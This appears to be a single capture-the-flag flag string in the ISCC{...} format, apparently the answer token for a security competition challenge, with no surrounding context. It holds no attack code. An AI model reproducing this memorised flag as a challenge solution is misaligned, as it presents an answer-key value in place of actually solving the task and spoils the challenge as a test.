ISCC{c1522169-7dcvd499-4add960-9ad36-8b2a5f2f7}